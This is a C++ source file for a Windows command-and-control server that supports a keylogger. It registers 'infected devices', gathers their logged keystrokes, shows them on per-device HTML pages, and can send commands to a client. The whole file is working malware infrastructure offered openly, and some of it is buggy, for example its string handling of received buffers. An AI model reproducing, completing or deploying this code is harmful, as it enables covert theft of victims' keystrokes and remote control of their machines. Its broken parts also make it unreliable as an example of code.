#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <unordered_map>
#include <string>
#include <sstream>
#include <vector>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

const int PORT = 8888;
unordered_map<string, SOCKET> infectedDevices;
unordered_map<string, string> keysLogged;

void sendCommand(const string& cmd) {
    auto it = infectedDevices.begin();
    if (it != infectedDevices.end()) {
        SOCKET clientSocket = it->second;
        int sendResult = send(clientSocket, cmd.c_str(), static_cast<int>(cmd.size()), 0);
        if (sendResult == SOCKET_ERROR) {
            cerr << "Failed to send command to client.\n";
        } else {
            cout << "Sent command to client: " << cmd << endl;
        }
    }
}

void checkforLogUpdates(){
    for (const auto& pair : infectedDevices) {
        const string& deviceId = pair.first;
        SOCKET currentSocket = infectedDevices[deviceId];
        fd_set readFileSet;
        FD_ZERO(&readFileSet);
        FD_SET(currentSocket, &readFileSet);
        if (FD_ISSET(currentSocket, &readFileSet)) {
            const string START_MARKER = "<FILE_START>";
            const string END_MARKER = "<FILE_END>";

            char buffer[4096];
            int bytesReceived;
            bool fileStarted = false;
            stringstream fileData;

            bytesReceived = recv(currentSocket, buffer, sizeof(buffer), 0);
            if (bytesReceived == SOCKET_ERROR || bytesReceived == 0) {
                cerr << "Receive failed or connection closed.\n";
                break;
            }
            string newLog = buffer + '\n';
            keysLogged[deviceId] += newLog;
        }

    }
}

void handle_request(SOCKET malwareSocket, const string& request) {
    string commandInput;
    if (request.find("GET /clients/Device") != string::npos) {
        cout<<"log"<<endl;
        // Extract DeviceID from commandInput
        string deviceId;
        size_t idPos = request.find("-");
        if (idPos != string::npos) {
            size_t idEndPos = request.find(" ", idPos);
            if (idEndPos == string::npos) {
                idEndPos = request.size();
            }
            deviceId = "Device-" + request.substr(idPos + 1, idEndPos - (idPos + 1));
        } 
        cout<<deviceId<<endl;
        cout <<keysLogged[deviceId]<<endl;

        stringstream htmlResponse;
        htmlResponse << "<html>"
                     << "<head><title>" << deviceId << "</title></head>"
                     << "<body>"
                     << "<h1>" << deviceId << "</h1>"
                     << keysLogged[deviceId]
                     << "</body>"
                     << "</html>";
        string response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + to_string(htmlResponse.str().size()) + "\r\n\r\n" + htmlResponse.str();
        send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
    }
    else if (request.find("GET /clients") != string::npos) {
        // Generate HTML for listing infected devices
        stringstream htmlResponse;
        htmlResponse << "<html>"
                     << "<head><title>Infected Devices</title></head>"
                     << "<body>"
                     << "<h1>Infected Devices</h1>";

        // Loop through infectedDevices and create links for each device ID
        for (const auto& pair : infectedDevices) {
            const string& deviceId = pair.first;
            htmlResponse << "<p><a href=\"/clients/" << deviceId << "\">" << deviceId << "</a></p>";
        }

        htmlResponse << "</body>"
                     << "</html>";

        string response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + to_string(htmlResponse.str().size()) + "\r\n\r\n" + htmlResponse.str();
        send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
    } else if (request.find("GET /newClient") != string::npos) {
        cout<<"new"<<endl;
         // Find the position of the newline characters that separate headers from body
        size_t pos = request.find("\r\n\r\n");
        if (pos != string::npos) {
            // Extract the command input after the header ending
            commandInput = request.substr(pos + 4);
        }

        // Extract DeviceID from commandInput
        string deviceId;
        size_t idPos = request.find("id=");
        if (idPos != string::npos) {
            size_t idEndPos = request.find(" ", idPos);
            if (idEndPos == string::npos) {
                idEndPos = request.size();
            }
            deviceId = request.substr(idPos + 3, idEndPos - (idPos + 3));
        } else {
            cerr << "Invalid client registration format." << endl;
            return;
        }

        // Add the device to infectedDevices map with deviceId as key and malwareSocket as value
        infectedDevices[deviceId] = malwareSocket;

        //accept connection
        string response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nconnected";
        send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
        

    } else {
        cout << "Unsupported request" << endl;
        string response = "HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\n\r\n<h1>Bad Request: Unsupported Endpoint</h1>";
        send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
    }
}


void run_server() {
    WSADATA wsaData;
    SOCKET CandCSocket = INVALID_SOCKET;
    struct sockaddr_in CandCAddress, deviceAddress;
    int deviceAddressLength = sizeof(deviceAddress);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed.\n";
        return;
    }

    CandCSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (CandCSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed.\n";
        WSACleanup();
        return;
    }

    CandCAddress.sin_family = AF_INET;
    CandCAddress.sin_addr.s_addr = INADDR_ANY;
    CandCAddress.sin_port = htons(PORT);
    if (bind(CandCSocket, (struct sockaddr*)&CandCAddress, sizeof(CandCAddress)) == SOCKET_ERROR) {
        cerr << "Bind failed.\n";
        closesocket(CandCSocket);
        WSACleanup();
        return;
    }

    if (listen(CandCSocket, SOMAXCONN) == SOCKET_ERROR) {
        cerr << "Listen failed.\n";
        closesocket(CandCSocket);
        WSACleanup();
        return;
    }

    while (true) {
        // Prepare the file descriptor set for select()
        checkforLogUpdates();
        fd_set readFileSet;
        FD_ZERO(&readFileSet);
        FD_SET(CandCSocket, &readFileSet);

        // Set timeout duration to 5 seconds
        timeval timeout;
        timeout.tv_sec = 2;
        timeout.tv_usec = 0;

        // Wait for incoming connections with timeout
        int selectResult = select(0, &readFileSet, nullptr, nullptr, &timeout);

        if (selectResult == SOCKET_ERROR) {
            cerr << "Select failed.\n";
            break;
        } else if (selectResult == 0) {
            //no connection skip loop
            continue;
        }

        // Accept incoming connection
        SOCKET malwareSocket = accept(CandCSocket, (struct sockaddr*)&deviceAddress, &deviceAddressLength);
        if (malwareSocket == INVALID_SOCKET) {
            cerr << "Accept failed.\n";
            closesocket(CandCSocket);
            WSACleanup();
            return;
        }

        char buffer[4096] = {0};
        int recvResult = recv(malwareSocket, buffer, sizeof(buffer), 0);
        if (recvResult == SOCKET_ERROR || recvResult == 0) {
            cerr << "Receive failed or connection closed.\n";
            closesocket(malwareSocket);
            continue;
        }

        // Handle the received request
        handle_request(malwareSocket, buffer);

        // Close the socket for this connection
        
    }
    closesocket(CandCSocket);
    WSACleanup();
}

int main() {
    run_server();
    return 0;
}
